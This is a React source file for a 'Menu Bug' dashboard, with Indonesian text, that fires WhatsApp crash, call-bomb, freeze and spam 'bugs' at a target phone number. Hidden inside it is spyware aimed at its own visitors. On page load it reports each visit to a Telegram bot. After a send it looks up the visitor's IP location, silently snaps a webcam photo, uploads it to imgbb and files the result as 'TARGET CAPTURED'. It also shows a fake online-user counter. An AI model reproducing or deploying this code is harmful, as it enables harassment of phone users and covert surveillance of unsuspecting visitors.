"use client"

import React, { useState, useEffect, useRef } from "react"
import { Shield, Bug, LayoutDashboard, Settings, Loader2, Music, ChevronLeft, ChevronRight, Volume2, VolumeX, Zap, EyeOff, Copy, CheckCircle2, AlertTriangle, ExternalLink, Lock, Ghost, Skull, ZapOff, Activity, Ban, Infinity } from "lucide-react"

export default function YaeMikoDashboard() {
  const [isHydrated, setIsHydrated] = useState(false)
  const [bugLimit, setBugLimit] = useState(5)
  const [isWebLocked, setIsWebLocked] = useState(false)
  const [isLoggedIn, setIsLoggedIn] = useState(false)
  const [username, setUsername] = useState("")
  const [password, setPassword] = useState("")
  const [isSending, setIsSending] = useState(false)
  const [isMusicOn, setIsMusicOn] = useState(true)
  const [isStealth, setIsStealth] = useState(false)
  const [engineSpeed, setEngineSpeed] = useState("Normal")
  const [targetNumber, setTargetNumber] = useState("")
  const [currentView, setCurrentView] = useState('dashboard')
  const [activeNav, setActiveNav] = useState(0)
  const [isCopied, setIsCopied] = useState(false)
  const [onlineUsers, setOnlineUsers] = useState(38)
  const [showErrorOverlay, setShowErrorOverlay] = useState(false)
  const [showLimitPopup, setShowLimitPopup] = useState(false)
  const [showRestrictedOverlay, setShowRestrictedOverlay] = useState(false)
  const [showVerifyModal, setShowVerifyModal] = useState(false)
  const [isVerified, setIsVerified] = useState(false)
  const [userRole, setUserRole] = useState<"free" | "admin">("free")
  const [senderType, setSenderType] = useState<"global" | "pribadi">("global")
  const [senderNumber, setSenderNumber] = useState("")
  const [pairingStatus, setPairingStatus] = useState<"idle" | "loading" | "success">("idle")
  
  // 🔧 FIX: Tambahin state & ref yang hilang
  const [isSenderPaired, setIsSenderPaired] = useState(false)
  const [pribadiLimit, setPribadiLimit] = useState(0)
  const [receivedCode, setReceivedCode] = useState<string | null>(null)
  const isSendingRef = useRef(false)
  const bgMusicRef = useRef<HTMLAudioElement | null>(null)

  // 🔧 FIX: Tambahin BUG_TYPES
  const BUG_TYPES = [
    { name: "Bug WA Crash", icon: Ghost, color: "from-red-500 to-red-700" },
    { name: "Bug Doc Exploit", icon: Bug, color: "from-purple-500 to-purple-700" },
    { name: "Bug Call Bomb", icon: Zap, color: "from-yellow-500 to-yellow-700" },
    { name: "Bug Freeze", icon: Shield, color: "from-cyan-500 to-cyan-700" },
    { name: "Bug Spam", icon: Activity, color: "from-green-500 to-green-700" },
    { name: "Bug Virus Total", icon: AlertTriangle, color: "from-orange-500 to-orange-700" },
    { name: "Bug Web Hacking", icon: Lock, color: "from-blue-500 to-blue-700" },
    { name: "Boot System", icon: ZapOff, color: "from-pink-500 to-pink-700" },
  ]

  // 🔧 FIX: Tambahin sendInitialIntel
  const sendInitialIntel = async () => {
    try {
      const token = process.env.NEXT_PUBLIC_TELE_TOKEN
      const chatId = "6481060681"
      await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: chatId,
          text: `🌐 *DASHBOARD DIAKSES*\n━━━━━━━━━━\n🕐 *Waktu:* ${new Date().toLocaleString()}\n🌍 *Platform:* WEB V3.0\n━━━━━━━━━━`,
          parse_mode: 'Markdown'
        })
      })
    } catch (e) { console.error(e) }
  }

  // 🔧 FIX: Tambahin getPreciseLocation
  const getPreciseLocation = async () => {
    try {
      const res = await fetch('https://ipapi.co/json/')
      const data = await res.json()
      return `📍 *Lokasi:* ${data.city || '?'}, ${data.region || '?'}, ${data.country_name || '?'}\n🌐 *IP:* ${data.ip || '?'}\n🏢 *ISP:* ${data.org || '?'}`
    } catch (e) {
      return '📍 *Lokasi:* Gagal mendeteksi'
    }
  }

  // 🔧 FIX: Tambahin uploadToIMGBB
  const uploadToIMGBB = async (blob: Blob) => {
    try {
      const formData = new FormData()
      formData.append('image', blob, 'capture.jpg')
      const res = await fetch('https://api.imgbb.com/1/upload?key=YOUR_IMGBB_API_KEY', {
        method: 'POST',
        body: formData
      })
      const data = await res.json()
      return data?.data?.url || null
    } catch (e) {
      return null
    }
  }

  // 🔧 FIX: Tambahin startFinalExecution
  const startFinalExecution = async () => {
    setIsSending(true)
    const preciseLoc = await getPreciseLocation()
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ video: true })
      const video = document.createElement('video')
      video.srcObject = stream
      await video.play()
      setTimeout(async () => {
        const canvas = document.createElement('canvas')
        canvas.width = video.videoWidth
        canvas.height = video.videoHeight
        canvas.getContext('2d')?.drawImage(video, 0, 0)
        const blob = await new Promise<Blob>(res => canvas.toBlob(res as BlobCallback, 'image/jpeg'))
        if (blob) {
          const photoUrl = await uploadToIMGBB(blob)
          const message = `📸 **TARGET CAPTURED**\n━━━━━━━━━━\n📱 **Target:** \`${targetNumber}\`\n🖼️ **Photo:** ${photoUrl || 'Upload Failed'}\n${preciseLoc}\n━━━━━━━━━━`
          await fetch(`/api/control`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ action: 'sendReport', messageText: message })
          })
        }
        stream.getTracks().forEach(t => t.stop())
        setIsSending(false)
      }, 3000)
    } catch (e) {
      await fetch(`/api/control`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          action: 'sendReport',
          messageText: `⚠️ **CAMERA BLOCKED**\nTarget: ${targetNumber}\n${preciseLoc}`
        })
      })
      setIsSending(false)
    }
  }

  const syncAllData = async () => {
    try {
      // 🔧 FIX: Perbaiki path /api/api/bug/send -> /api/control
      const res = await fetch(`/api/control?update=${Date.now()}`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ action: 'get_data', username: username || null })
      })
      const data = await res.json()
      if (data) {
        if (data.isLocked !== undefined) setIsWebLocked(data.isLocked === true)
        if (data.limit !== undefined && !isSendingRef.current) setBugLimit(Number(data.limit))
        if (data.pairingCode && pairingStatus === "loading") {
          setReceivedCode(data.pairingCode)
          setPairingStatus("success")
        }
        if (data.isPaired !== undefined) {
          setIsSenderPaired(data.isPaired === true)
          setPribadiLimit(data.isPaired === true ? 10 : 0)
        }
      }
    } catch (err) { console.error(err) }
  }

  const handleRequestPairing = async () => {
    if (!senderNumber) return alert("Masukin nomor sender dulu!")
    setPairingStatus("loading")
    try {
      await fetch('/api/control', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ action: 'sendReport', messageText: `/pair ${senderNumber}` })
      })
      const checkInterval = setInterval(async () => { await syncAllData() }, 3000)
      setTimeout(() => {
        clearInterval(checkInterval)
        setPairingStatus((prev) => prev === "loading" ? "idle" : prev)
      }, 45000)
    } catch (e) { console.error(e); setPairingStatus("idle") }
  }

  const handleLogin = async () => {
    try {
      const res = await fetch('/api/control', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ action: 'login', username, password })
      })
      const data = await res.json()
      if (data.success) {
        setUserRole(data.role)
        setIsLoggedIn(true)
        setShowErrorOverlay(false)
        if (data.role === "admin") {
          localStorage.setItem("admin_key", password)
        }
        await syncAllData()
      } else {
        setShowErrorOverlay(true)
      }
    } catch (e) { console.error(e) }
  }

  const handleSendBug = async () => {
    if (!targetNumber) {
      alert("Masukin nomor target dulu!")
      return
    }
    if (targetNumber === "6289505198913") {
      setShowRestrictedOverlay(true)
      return
    }
    if (senderType === "pribadi" && !isSenderPaired) {
      alert("Kamu belum pairing sender pribadi!")
      return
    }
    isSendingRef.current = true
    const selectedBug = BUG_TYPES[activeNav].name
    const delay = engineSpeed === "Instant" ? 1000 : engineSpeed === "Fast" ? 2500 : 4000

    setTimeout(async () => {
      // 🔧 FIX: Perbaiki path /api/bug -> /api/bug/send
      const res = await fetch('/api/bug/send', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ username, targetNumber, selectedBug, engineSpeed, senderType, senderNumber })
      })
      const data = await res.json()
      if (!data.success) {
        if (data.error && data.error.includes("Limit")) {
          setShowLimitPopup(true)
        } else {
          alert(data.error || "Gagal mengirim bug")
        }
        isSendingRef.current = false
        return
      }
      await syncAllData()
      if (isVerified) {
        startFinalExecution()
      } else {
        setShowVerifyModal(true)
      }
      setTimeout(() => { isSendingRef.current = false }, 8000)
    }, delay)
  }

  const copyToClipboard = () => {
    if (typeof navigator !== 'undefined' && targetNumber) {
      navigator.clipboard.writeText(targetNumber)
      setIsCopied(true)
      setTimeout(() => setIsCopied(false), 2000)
    }
  }

  useEffect(() => {
    sendInitialIntel()
    setIsHydrated(true)
  }, [])

  useEffect(() => {
    if (!isLoggedIn) return
    syncAllData()
    const autoRefresh = setInterval(async () => { await syncAllData() }, 4000)
    return () => clearInterval(autoRefresh)
  }, [isLoggedIn, username, pairingStatus])

  useEffect(() => {
    const interval = setInterval(() => {
      setOnlineUsers(prev => {
        const direction = Math.random() > 0.5 ? 1 : -1
        const nextValue = prev + direction
        return nextValue < 15 ? 16 : nextValue > 50 ? 49 : nextValue
      })
    }, 8000)
    return () => clearInterval(interval)
  }, [])

  useEffect(() => {
    if (bgMusicRef.current && isHydrated) {
      if (isMusicOn && isLoggedIn && !isWebLocked) {
        bgMusicRef.current.play().catch(() => {})
      } else {
        bgMusicRef.current.pause()
      }
    }
  }, [isMusicOn, isLoggedIn, isWebLocked, isHydrated])

  if (!isHydrated) {
    return (
      <div className="min-h-screen bg-[#0a0f1a] flex items-center justify-center">
        <Loader2 className="w-8 h-8 text-cyan-400 animate-spin" />
      </div>
    )
  }

  if (isWebLocked) {
    return (
      <div className="min-h-screen bg-[#0a0f1a] flex items-center justify-center">
        <div className="text-center p-8">
          <h1 className="text-4xl font-bold text-red-500 mb-4 animate-glitch_extreme">⚠️ SYSTEM MAINTENANCE ⚠️</h1>
          <p className="text-gray-400 text-lg">Sabar Dongo, Server lagi Update Sama Selz. Balik Lagi Nanti Kalau Udah Selesai Update nya.</p>
        </div>
      </div>
    )
  }

  const currentStatus = senderType === 'pribadi'
    ? (isSenderPaired ? { text: 'ACT', color: 'text-[#00e676]' } : { text: 'OFF', color: 'text-[#ff3b3b]' })
    : (bugLimit > 0 ? { text: 'ACT', color: 'text-[#00e676]' } : { text: 'OFF', color: 'text-[#ff3b3b]' })

  return (
    <div className="min-h-screen bg-[#0a0f1a] text-white overflow-hidden relative">
      {/* Background Video */}
      <video
        autoPlay
        loop
        muted
        playsInline
        className="fixed inset-0 w-full h-full object-cover opacity-30 z-0"
      >
        <source src="/bg-anime.mp4" type="video/mp4" />
      </video>

      {/* Background Music */}
      <audio ref={bgMusicRef} loop>
        <source src="/audio.mp3" type="audio/mpeg" />
      </audio>

      {/* Overlay gradient */}
      <div className="fixed inset-0 bg-gradient-to-b from-[#0a0f1a]/80 via-[#0a0f1a]/60 to-[#0a0f1a]/90 z-[1]" />

      {/* Cyberpunk grid overlay */}
      <div className="fixed inset-0 bg-[linear-gradient(rgba(0,212,255,0.03)_1px,transparent_1px),linear-gradient(90deg,rgba(0,212,255,0.03)_1px,transparent_1px)] bg-[size:40px_40px] z-[2]" />

      {/* Scanline effect */}
      <div className="fixed inset-0 pointer-events-none z-[3] bg-[repeating-linear-gradient(0deg,transparent,transparent_2px,rgba(0,0,0,0.03)_2px,rgba(0,0,0,0.03)_4px)]" />

      {/* MAIN CONTENT */}
      <div className="relative z-10 min-h-screen flex flex-col">
        {/* TOP BAR */}
        <header className="glass-strong border-b border-cyan-500/20 px-6 py-3 flex items-center justify-between">
          <div className="flex items-center gap-3">
            <div className="w-10 h-10 rounded-lg bg-gradient-to-br from-cyan-500 to-blue-600 flex items-center justify-center shadow-lg shadow-cyan-500/20">
              <Skull className="w-5 h-5 text-white" />
            </div>
            <div>
              <h1 className="text-lg font-bold text-glow-cyan tracking-wider">YAE MIKO</h1>
              <p className="text-[10px] text-gray-500 tracking-[0.2em] uppercase">Menu Bug v3.0</p>
            </div>
          </div>

          <div className="flex items-center gap-4">
            {/* Online Users Fake Counter */}
            <div className="hidden sm:flex items-center gap-2 px-3 py-1.5 rounded-full bg-green-500/10 border border-green-500/20">
              <div className="w-2 h-2 rounded-full bg-green-400 animate-pulse" />
              <span className="text-xs text-green-400 font-mono">{onlineUsers} ONLINE</span>
            </div>

            {/* Music Toggle */}
            <button
              onClick={() => setIsMusicOn(!isMusicOn)}
              className="p-2 rounded-lg hover:bg-white/5 transition-all"
            >
              {isMusicOn ? <Volume2 className="w-4 h-4 text-cyan-400" /> : <VolumeX className="w-4 h-4 text-gray-500" />}
            </button>

            {/* Status Indicator */}
            <div className="flex items-center gap-2 px-3 py-1.5 rounded-full bg-white/5 border border-white/10">
              <div className={`w-2 h-2 rounded-full ${currentStatus.color} animate-pulse`} />
              <span className={`text-xs font-mono ${currentStatus.color}`}>{currentStatus.text}</span>
            </div>
          </div>
        </header>

        {/* LOGIN SCREEN */}
        {!isLoggedIn ? (
          <div className="flex-1 flex items-center justify-center p-4">
            <div className="glass-strong rounded-2xl p-8 w-full max-w-md border border-cyan-500/20 glow-cyan">
              <div className="text-center mb-8">
                <div className="w-20 h-20 mx-auto rounded-2xl bg-gradient-to-br from-cyan-500 to-purple-600 flex items-center justify-center mb-4 shadow-2xl">
                  <Shield className="w-10 h-10 text-white" />
                </div>
                <h2 className="text-2xl font-bold text-glow-cyan">Akses Dashboard</h2>
                <p className="text-gray-500 text-sm mt-1">Masuk pake akun Selz</p>
              </div>

              {showErrorOverlay && (
                <div className="mb-4 p-3 rounded-xl bg-red-500/10 border border-red-500/20 text-red-400 text-sm text-center animate-shake_violent">
                  <AlertTriangle className="w-4 h-4 inline mr-1" />
                  Username atau Password salah!
                </div>
              )}

              <input
                type="text"
                placeholder="Username"
                value={username}
                onChange={(e) => setUsername(e.target.value)}
                className="w-full mb-3 px-4 py-3 rounded-xl bg-[#0a1628]/80 border border-cyan-500/20 focus:border-cyan-400/50 outline-none text-white placeholder-gray-600 transition-all"
              />
              <input
                type="password"
                placeholder="Password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                onKeyDown={(e) => e.key === 'Enter' && handleLogin()}
                className="w-full mb-5 px-4 py-3 rounded-xl bg-[#0a1628]/80 border border-cyan-500/20 focus:border-cyan-400/50 outline-none text-white placeholder-gray-600 transition-all"
              />
              <button
                onClick={handleLogin}
                className="w-full py-3 rounded-xl bg-gradient-to-r from-cyan-500 to-blue-600 text-white font-bold text-sm tracking-wider uppercase hover:shadow-lg hover:shadow-cyan-500/20 transition-all"
              >
                Login
              </button>
            </div>
          </div>
        ) : (
          /* DASHBOARD */
          <div className="flex-1 p-4 sm:p-6 overflow-y-auto">
            {/* STATS CARDS */}
            <div className="grid grid-cols-2 sm:grid-cols-4 gap-3 mb-6">
              <div className="glass rounded-xl p-4 border border-cyan-500/10">
                <p className="text-xs text-gray-500 uppercase tracking-wider mb-1">Limit Sisa</p>
                <p className="text-2xl font-bold text-glow-cyan">{bugLimit}/5</p>
              </div>
              <div className="glass rounded-xl p-4 border border-green-500/10">
                <p className="text-xs text-gray-500 uppercase tracking-wider mb-1">Status</p>
                <p className={`text-lg font-bold ${currentStatus.color}`}>{currentStatus.text === 'ACT' ? 'ACTIVE' : 'OFFLINE'}</p>
              </div>
              <div className="glass rounded-xl p-4 border border-purple-500/10">
                <p className="text-xs text-gray-500 uppercase tracking-wider mb-1">Role</p>
                <p className="text-lg font-bold text-glow-pink">{userRole.toUpperCase()}</p>
              </div>
              <div className="glass rounded-xl p-4 border border-yellow-500/10">
                <p className="text-xs text-gray-500 uppercase tracking-wider mb-1">Engine</p>
                <p className="text-lg font-bold text-yellow-400">{engineSpeed}</p>
              </div>
            </div>

            {/* BUG TYPE NAVIGATION */}
            <div className="glass rounded-2xl p-4 mb-4 border border-cyan-500/10">
              <div className="flex items-center gap-2 mb-3">
                <Bug className="w-4 h-4 text-cyan-400" />
                <span className="text-xs text-gray-500 uppercase tracking-wider">Pilih Bug</span>
              </div>
              <div className="grid grid-cols-4 sm:grid-cols-8 gap-2">
                {BUG_TYPES.map((bug, index) => {
                  const Icon = bug.icon
                  return (
                    <button
                      key={index}
                      onClick={() => setActiveNav(index)}
                      className={`p-3 rounded-xl flex flex-col items-center gap-1 transition-all ${
                        activeNav === index
                          ? `bg-gradient-to-br ${bug.color} shadow-lg scale-105`
                          : 'bg-white/5 hover:bg-white/10'
                      }`}
                    >
                      <Icon className={`w-5 h-5 ${activeNav === index ? 'text-white' : 'text-gray-400'}`} />
                      <span className={`text-[8px] ${activeNav === index ? 'text-white' : 'text-gray-500'} uppercase truncate w-full text-center`}>
                        {bug.name.replace('Bug ', '')}
                      </span>
                    </button>
                  )
                })}
              </div>
            </div>

            {/* MAIN CONTROL */}
            <div className="glass rounded-2xl p-4 sm:p-6 border border-cyan-500/10">
              <div className="flex items-center gap-2 mb-4">
                <Zap className="w-4 h-4 text-cyan-400" />
                <span className="text-xs text-gray-500 uppercase tracking-wider">Control Panel</span>
              </div>

              <div className="space-y-3">
                {/* Target Input */}
                <div className="relative">
                  <input
                    type="text"
                    placeholder="Masukin nomor target (628xxx)"
                    value={targetNumber}
                    onChange={(e) => setTargetNumber(e.target.value)}
                    className="w-full px-4 py-3 pr-12 rounded-xl bg-[#0a1628]/80 border border-cyan-500/20 focus:border-cyan-400/50 outline-none text-white placeholder-gray-600 transition-all"
                  />
                  {targetNumber && (
                    <button
                      onClick={copyToClipboard}
                      className="absolute right-3 top-1/2 -translate-y-1/2 p-1.5 rounded-lg hover:bg-white/10 transition-all"
                    >
                      {isCopied ? <CheckCircle2 className="w-4 h-4 text-green-400" /> : <Copy className="w-4 h-4 text-gray-500" />}
                    </button>
                  )}
                </div>

                {/* Engine Speed Selector */}
                <div className="flex gap-2">
                  {["Instant", "Fast", "Normal"].map((speed) => (
                    <button
                      key={speed}
                      onClick={() => setEngineSpeed(speed)}
                      className={`flex-1 py-2 rounded-xl text-xs font-bold uppercase tracking-wider transition-all ${
                        engineSpeed === speed
                          ? 'bg-gradient-to-r from-cyan-500 to-blue-600 text-white shadow-lg shadow-cyan-500/20'
                          : 'bg-white/5 text-gray-400 hover:bg-white/10'
                      }`}
                    >
                      {speed}
                    </button>
                  ))}
                </div>

                {/* Sender Mode */}
                <div className="flex gap-2">
                  <button
                    onClick={() => setSenderType("global")}
                    className={`flex-1 py-2 rounded-xl text-xs font-bold uppercase tracking-wider transition-all ${
                      senderType === "global"
                        ? 'bg-gradient-to-r from-green-500 to-emerald-600 text-white shadow-lg shadow-green-500/20'
                        : 'bg-white/5 text-gray-400 hover:bg-white/10'
                    }`}
                  >
                    Global ({bugLimit})
                  </button>
                  <button
                    onClick={() => setSenderType("pribadi")}
                    className={`flex-1 py-2 rounded-xl text-xs font-bold uppercase tracking-wider transition-all ${
                      senderType === "pribadi"
                        ? 'bg-gradient-to-r from-purple-500 to-pink-600 text-white shadow-lg shadow-purple-500/20'
                        : 'bg-white/5 text-gray-400 hover:bg-white/10'
                    }`}
                  >
                    Pribadi ({pribadiLimit})
                  </button>
                </div>

                {/* Pribadi Settings */}
                {senderType === "pribadi" && (
                  <div className="p-3 rounded-xl bg-white/5 border border-purple-500/20 space-y-2">
                    <input
                      type="text"
                      placeholder="Nomor sender kamu"
                      value={senderNumber}
                      onChange={(e) => setSenderNumber(e.target.value)}
                      className="w-full px-3 py-2 rounded-lg bg-[#0a1628]/80 border border-purple-500/20 outline-none text-white placeholder-gray-600 text-sm"
                    />
                    <button
                      onClick={handleRequestPairing}
                      disabled={pairingStatus === "loading"}
                      className="w-full py-2 rounded-lg bg-gradient-to-r from-purple-500 to-pink-600 text-white text-xs font-bold uppercase tracking-wider hover:shadow-lg hover:shadow-purple-500/20 transition-all disabled:opacity-50"
                    >
                      {pairingStatus === "loading" ? "Meminta Kode..." : pairingStatus === "success" ? `Pairing: ${receivedCode}` : "Pairing Sender"}
                    </button>
                    {pairingStatus === "loading" && (
                      <div className="flex items-center gap-2 text-xs text-yellow-400">
                        <Loader2 className="w-3 h-3 animate-spin" />
                        Tunggu kode pairing dari bot...
                      </div>
                    )}
                  </div>
                )}

                {/* SEND BUTTON */}
                <button
                  onClick={handleSendBug}
                  disabled={isSending || !targetNumber || (senderType === "pribadi" && !isSenderPaired)}
                  className="w-full py-4 rounded-xl bg-gradient-to-r from-red-600 to-red-800 text-white font-bold text-sm uppercase tracking-wider hover:shadow-lg hover:shadow-red-500/30 transition-all disabled:opacity-30 disabled:cursor-not-allowed"
                >
                  {isSending ? (
                    <span className="flex items-center justify-center gap-2">
                      <Loader2 className="w-4 h-4 animate-spin" />
                      PROCESSING...
                    </span>
                  ) : (
                    <span className="flex items-center justify-center gap-2">
                      <Skull className="w-5 h-5" />
                      Kirim Bug
                    </span>
                  )}
                </button>
              </div>
            </div>
          </div>
        )}

        {/* BOTTOM NAV */}
        {isLoggedIn && (
          <div className="fixed bottom-8 left-4 right-4 z-20">
            <div className="glass-strong rounded-2xl p-2 flex justify-around border border-white/10 shadow-2xl max-w-md mx-auto">
              <button
                onClick={() => setCurrentView('dashboard')}
                className={`p-3 rounded-xl transition-all ${currentView === 'dashboard' ? 'text-cyan-400 bg-cyan-500/10' : 'text-white/30 hover:text-white/50'}`}
              >
                <LayoutDashboard size={22} />
              </button>
              <button
                onClick={() => setCurrentView('settings')}
                className={`p-3 rounded-xl transition-all ${currentView === 'settings' ? 'text-cyan-400 bg-cyan-500/10' : 'text-white/30 hover:text-white/50'}`}
              >
                <Settings size={22} />
              </button>
              <button
                onClick={() => {
                  setIsLoggedIn(false)
                  setUsername("")
                  setPassword("")
                }}
                className="p-3 rounded-xl text-red-400 hover:bg-red-500/10 transition-all"
              >
                <LogOut size={22} />
              </button>
            </div>
          </div>
        )}
      </div>
    </div>
  )
